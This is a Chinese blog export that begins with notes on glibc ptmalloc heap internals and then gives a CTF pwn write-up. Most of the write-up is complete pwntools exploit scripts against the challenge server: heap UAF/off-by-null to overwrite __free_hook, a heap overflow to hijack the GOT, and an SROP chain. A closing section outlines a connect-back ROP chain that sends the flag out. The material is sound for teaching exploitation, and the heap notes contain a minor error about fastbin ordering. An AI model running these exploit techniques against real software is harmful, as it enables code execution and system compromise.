<p>如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong>是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。</p>
</li>
<li><p>size of chunk</p>
<p>该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ  的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是  8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示</p>
<ul>
<li> NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li>
<li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。 </li>
<li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li>
</ul>
</li>
</ul>
<p>再介绍一下其中一些值得注意的点：</p>
<ol>
<li>prev_size 区域只有当上一个区域释放后才会使用，其大小为用户申请的大小，否则会被用作上一个块的 mem 区域使用。这样能使 chunk 的空间变小，称作空间复用。</li>
<li>一般来说用户申请的区域都是 2*size_t 大小，若申请的大小与 2*size_t 取模后的空间小于size_t则会遇见第一条的情况；大于则再多申请 2*size_t 的空间。因此堆是相当对齐的。</li>
</ol>
<p>而 chunk 在空闲的时候不仅有下一块 prev_size 的变化，其 mem 空间还会加如许多其他信息，空闲 chunk 在内存中的结构如图所示：</p>
<p><img src="https://s2.loli.net/2022/03/16/kLPGpAorDF5h1TY.png" alt="空闲chunk结构"></p>
<p>这个图相比于上一张图，多了4个指针：</p>
<ul>
<li>Forward pointer to next chunk in list(fd)：指向前一个空闲的chunk</li>
<li>Back pointer to previous chunk in list(bk)：指向后一个空闲的chunk</li>
<li>Forward pointer to next chunk size in list(fd_nextsize)：前一个与当前 chunk 大小不同的空闲 chunk</li>
<li>Back pointer to previous chunk size in list(bk_nextsize)：后一个当前 chunk 大小不同的空闲 chunk</li>
</ul>
<p>ptmalloc 通过前两个指针将大小相近的 chunk 连成一个双向链表。后两个指针是 large bin 中空闲 chunk 才有的。作用等下介绍。</p>
<p>除此之外，当 chunk 空闲时，其 M 状态不存在，只有 AP 状态。</p>
<h4 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h4><p>arena 分为 main_arena &amp; non_main_arena。且曾经分配区只有一个 main_arena，且每次分配内存都会对 main_arena 加锁，待分配完成后才会释放。当我们进行多线程操作时，这种设计就显得及其拖沓，影响效率。</p>
<p>pwndbg 中展示了 main_arena 的结构如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p/x main_arena</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  mutex = 0x0, </span><br><span class="line">  flags = 0x0, </span><br><span class="line">  fastbinsY = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">  top = 0x0, </span><br><span class="line">  last_remainder = 0x0, </span><br><span class="line">  bins = &#123;0x0 &lt;repeats 254 <span class="built_in">times</span>&gt;&#125;, </span><br><span class="line">  binmap = &#123;0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">  next = 0x7ffff7dd1b20, </span><br><span class="line">  next_free = 0x0, </span><br><span class="line">  attached_threads = 0x1, </span><br><span class="line">  system_mem = 0x0, </span><br><span class="line">  max_system_mem = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="空闲的-chunk-容器"><a href="#空闲的-chunk-容器" class="headerlink" title="空闲的 chunk 容器"></a>空闲的 chunk 容器</h4><h5 id="total-bins"><a href="#total-bins" class="headerlink" title="total bins"></a>total bins</h5><p>当用户 free chunk 后，该 chunk 不会立即归还给系统，ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲 chunk，在用户下一次申请时，会首先在这些空闲 chunk 中挑选一块给用户，这样能降低内存分配的开销。</p>
<p>ptmalloc 将相似大小的 chunk 用双向链表连接起来，这个双向链表称为bin。ptmalloc 一共维护了136个bin。其中10个为 fast bin ，占用一个数组；剩下的126个 bin，占用一个数组，其中有一个为 unsorted bin，62个 small bin，63个 large bin。</p>
<p>这些成员的地址都可以在 main_arena.bins 中看见。</p>
<h6 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h6><p>我们将 chunk_size 小于 0x80 的 chunk 称为 fast chunk，因为这个大小范围内的 chunk 在释放后会被放入 fast bin 中。当用户申请内存的大小属于这个范围内，将会优先在这里遍历寻找合适的chunk。</p>
<p>这个数组中存储的元素是双向链表的头节点地址，并且对应不同大小的数组的链表对应不同数组的下标。得到对应下标的宏定义：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz)                                                      \</span></span><br><span class="line"><span class="meta">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure>

<p>fast bin 使用 fd 指针寻址，即在链表中按照先进先出(FILO)的顺序被取出(队列)。</p>
<h6 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h6><p><strong>unsorted bin</strong></p>
<p>如果被释放的 chunk 不属于 fast_chunk 的范围，那么这些 chunk 就会被放到 unsorted bin 中。</p>
<p>在 malloc 的过程中，会将 unsorted bin 中的 chunk 重新分配给 small bins 和 large bins，<a href="https://messap.github.io/2022/07/12/%E5%A0%86%E5%88%86%E9%85%8D%E6%B5%81%E7%A8%8B/">分配流程中讲</a>。</p>
<p><strong>small bin</strong></p>
<p>small bins 中每个 chunk 的大小与其所在的 bin 的下标的关系为：chunk_size = 2 * SIZE_SZ *index，具体如下</p>
<table>
<thead>
<tr>
<th>下标</th>
<th>SIZE_SZ=4（32 位）</th>
<th>SIZE_SZ=8（64 位）</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td>16</td>
<td>32</td>
</tr>
<tr>
<td>3</td>
<td>24</td>
<td>48</td>
</tr>
<tr>
<td>4</td>
<td>32</td>
<td>64</td>
</tr>
<tr>
<td>5</td>
<td>40</td>
<td>80</td>
</tr>
<tr>
<td>x</td>
<td>2*4*x</td>
<td>2*8*x</td>
</tr>
<tr>
<td>63</td>
<td>504</td>
<td>1008</td>
</tr>
</tbody></table>
<p>得到对应下标的宏定义如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION)</span></span><br></pre></td></tr></table></figure>

<p><strong>large bin</strong></p>
<p>large bins 中每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致，具体如下</p>
<table>
<thead>
<tr>
<th>组</th>
<th>数量</th>
<th>公差</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>32</td>
<td>64B</td>
</tr>
<tr>
<td>2</td>
<td>16</td>
<td>512B</td>
</tr>
<tr>
<td>3</td>
<td>8</td>
<td>4096B</td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td>32768B</td>
</tr>
<tr>
<td>5</td>
<td>2</td>
<td>262144B</td>
</tr>
<tr>
<td>6</td>
<td>1</td>
<td>不限制</td>
</tr>
</tbody></table>
<p>得到对应下标的宏定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index(sz) \</span></span><br><span class="line"><span class="meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span></span><br><span class="line"><span class="meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span></span><br><span class="line"><span class="meta">   : largebin_index_32 (sz))</span></span><br></pre></td></tr></table></figure>

<h4 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h4><p>top chunk对于主分配区和非主分配区来说是不一样的，这里仅介绍针对 main_arena 的。</p>
<p>对于 main_arena，top chunk 会在第一次调用 malloc 时被分配一块chunk_size + 128KB &amp; align 4KB 大小的空间并且作为初始 heap。</p>
<p>分配时，当用户无法从 total bins 中分配时，就会从 top chunk 中分配内存，可以直接取出一块内存给用户。在回收内存时，若与 top chunk 相邻且大小不属于 fast_chunk，就会与 top chunk 合并，<a href="https://messap.github.io/2022/07/12/%E5%A0%86%E5%88%86%E9%85%8D%E6%B5%81%E7%A8%8B/">流程中再细说</a>。</p>
<p>若 top chunk 没有空闲内存，ptmalloc 会调用 sbrk() 将进程 heap 的边界上移，然后修改 top chunk 的大小。</p>
<h4 id="mmaped-chunk"><a href="#mmaped-chunk" class="headerlink" title="mmaped chunk"></a>mmaped chunk</h4><p>当前需要分配的 chunk 太大时，total bins 都不能满足要求，甚至top chunk 本身也不能满足分配需求时，ptmalloc 会使用 mmap 来直接使用内存映射来将页映射到进程空间。这样分配的 chunk 在被 free 时会直接解除映射，将内存归还给操作系统。</p>
<h4 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last remainder"></a>last remainder</h4><p>chunk 的一种中间态，当需要分配一个 chunk，但在 bins 中找不到合适的 chunk 时，如果 last remainder 中存在大小适合或大一点的 chunk，就会直接使用或分裂成两个 chunk，剩下的那个变成新的 last remainder chunk。</p>
<h4 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h4><p>tcache是glibc 2.26之后引入的一种技术，同bin一起提升堆的管理效率，使用的优先级比fastbin还高。</p>
<p>新增了两个结构体:</p>
<ul>
<li>tcache_entry</li>
<li>tcache_perthread_struct</li>
</ul>
<p>tcache_entry用于链接空闲的chunk结构体;tcache_perthread_struct是用来管理tcache链表。</p>
<p>tcache的范围很大，不超过0x408(加上header为0x418)的chunk释放后都将放入tcache bins，因此有0x40个bin，每个bin中最多有TCACHE_FILL_COUNT(默认为7)个空闲chunk。</p>
<p><strong>参考</strong></p>
<p><a href="https://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf">Glibc 内存管理-Ptmalloc2 源代码分析</a><br><a href="https://ctf-wiki.org/">ctf-wiki</a></p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>covteamctf_pwn_wp</title>
    <url>/2022/07/07/covteamctf-pwn-wp/</url>
    <content><![CDATA[<!-- 审核赛捏 -->

<span id="more"></span>

<h2 id="EDGvsDKgame1"><a href="#EDGvsDKgame1" class="headerlink" title="EDGvsDKgame1"></a>EDGvsDKgame1</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>保护全开</p>
<p>note 类型的堆题，每个功能都有。</p>
<p>审出的漏洞有：</p>
<ul>
<li>create 时是以 num 为下标，而 delete 堆会使 num-- ，当我们一次释放掉多个 chunk，再 create 会覆盖掉未释放的 chunk。虽然没用上</li>
<li>delete 功能存在 uaf</li>
<li>edit 功能存在 off-by-null</li>
</ul>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>利用 off-by-null 漏洞和 edit 功能实现堆重叠</li>
<li>利用 uaf 漏洞和 show 功能泄露 libc 版本</li>
<li>利用 uaf 漏洞和 edit 功能修改 tcaches 进行 getshell</li>
</ol>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;ctf.joe1sn.top&#x27;</span>,<span class="number">28020</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">heap=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xa1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    edit(i,<span class="number">0x20</span>,payload)</span><br><span class="line">    free(i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">main_arena=u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">libc_base=main_arena-<span class="number">0x3ebca0</span></span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">edit(<span class="number">13</span>,<span class="number">0x10</span>,p64(free_hook)+p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#6</span></span><br><span class="line">edit(<span class="number">6</span>,<span class="number">8</span>,p64(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">13</span>,<span class="number">8</span>,<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"><span class="comment"># print hex(free_hook)</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="FairPwn"><a href="#FairPwn" class="headerlink" title="FairPwn"></a>FairPwn</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>No PIE 与 Partial RELRO</p>
<p>程序申请两个 chunk 分别用来存储 name 和 message，message 的地址在 name chunk 的第5个地址块。</p>
<p>程序可以对 name 和 message 修改两次，并在第一次输入后输出一次内容，第二次输入后释放掉两个 chunk。</p>
<p>审出的漏洞有：</p>
<ul>
<li>使用栈上变量给堆变量赋值时，由于读入长度没有很好的检查，导致 strcpy 时会将 v4 与 src 一起复制给堆变量造成堆溢出</li>
</ul>
<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>利用堆溢出漏洞，将 name chunk 中的 message info 修改为 puts_got，待输出后泄露 libc 版本</li>
<li>利用堆溢出漏洞，将 free_got 修改为 system，free_got 位于 puts_got 后，待第二吃输出后 getshell</li>
</ol>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./pwn4&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;ctf.joe1sn.top&#x27;</span>,<span class="number">28061</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.23.so&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">ptr =<span class="number">0x00000000004040B0</span></span><br><span class="line">vuln=<span class="number">0x0000000000401376</span></span><br><span class="line"></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;Please enter your name: &quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">payload=p64(puts_got)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">sla(<span class="string">&quot;Please enter your message: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Your Message:&quot;</span>)</span><br><span class="line">puts_addr=u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2libc</span>(<span class="params">func,func_addr,flag=<span class="number">1</span>,one_gadget_addr=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        libc=ELF(libc_file)</span><br><span class="line">        <span class="comment"># libc=elf.libc</span></span><br><span class="line">        libc_base=func_addr-libc.sym[func]</span><br><span class="line">        sys_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        binsh=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">        environ=libc_base+libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">        __malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">        __free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">        libc=LibcSearcher(func,func_addr)</span><br><span class="line">        libc_base=func_addr-libc.dump(func)</span><br><span class="line">        sys_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">        binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">        environ=libc_base+libc.dump(<span class="string">&#x27;_environ&#x27;</span>)</span><br><span class="line">        __malloc_hook=libc_base+libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">        __free_hook=libc_base+libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;libc_base&#x27;</span>:libc_base,<span class="string">&#x27;system&#x27;</span>:sys_addr,<span class="string">&#x27;binsh&#x27;</span>:binsh,<span class="string">&#x27;environ&#x27;</span>:environ,<span class="string">&#x27;__malloc_hook&#x27;</span>:__malloc_hook,<span class="string">&#x27;__free_hook&#x27;</span>:__free_hook&#125;</span><br><span class="line"></span><br><span class="line">libc=ret2libc(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;Your Name are right?&quot;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;Please enter your name again: &quot;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">sa(<span class="string">&quot;Your Message are right?&quot;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">&#x27;\0&#x27;</span>*<span class="number">7</span>+p64(libc[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sla(<span class="string">&quot;Please enter your Message again: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="babysrop"><a href="#babysrop" class="headerlink" title="babysrop"></a>babysrop</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>保护全关</p>
<p>开门见山，一个栈溢出漏洞</p>
<h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>利用栈溢出漏洞，将返回地址及其下两个地址覆盖为 srop 函数，再次调用并输入一个字符 ‘\xf3’，使得返回 rax=1，同时修改返回地址使得调用 sys_write，泄露 libc 版本，然后同样使用这个方法输入15个字符，调用 sys_rt_sigreturn</li>
<li>根据题目，使用 pwnlibc.SigreturnFrame 来解题</li>
</ol>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./test&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;ctf.joe1sn.top&#x27;</span>,<span class="number">28013</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">dump=<span class="number">0x00000000004011F0</span></span><br><span class="line"></span><br><span class="line">payload=p64(dump)*<span class="number">3</span></span><br><span class="line">sl(payload)</span><br><span class="line">s(<span class="string">&#x27;\xf3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main=u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))-<span class="number">240</span></span><br><span class="line"></span><br><span class="line">r(<span class="number">10</span>)</span><br><span class="line">stack_addr=u64(r(<span class="number">8</span>))-<span class="number">0xe0</span></span><br><span class="line"></span><br><span class="line">flag=<span class="number">0x0000000000404080</span></span><br><span class="line"></span><br><span class="line">syscall=<span class="number">0x00000000004011fe</span></span><br><span class="line"></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=constants.SYS_write</span><br><span class="line">frame.rdi=<span class="number">1</span></span><br><span class="line">frame.rsi=flag</span><br><span class="line">frame.rdx=<span class="number">0x100</span></span><br><span class="line">frame.rip=syscall</span><br><span class="line"></span><br><span class="line">payload=p64(dump)+p64(syscall)+<span class="built_in">str</span>(frame)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sl(payload[<span class="number">8</span>:<span class="number">22</span>])</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="EDGvsDKgame5"><a href="#EDGvsDKgame5" class="headerlink" title="EDGvsDKgame5"></a>EDGvsDKgame5</h2><p>第一次碰见这种题，但是学长给了提示 <code>socket+connect</code> 后觉得也没那么难，属于是和网络编程知识联动了。</p>
<h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>开启 NX 保护和 Partial RELRO</p>
<p>开启沙盒，禁止了 execve</p>
<p>开门见山，存在栈溢出漏洞，等待输入后关闭 stdin stdout stderr 文件流</p>
<h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>利用栈溢出漏洞，向栈上写入覆盖为 ropchain</li>
<li>根据 hint，本题是通过 socket+connect 来进行远程连接，然后使用 orw 将 flag 返回回来，在本地监听一个端口等待即可</li>
</ol>
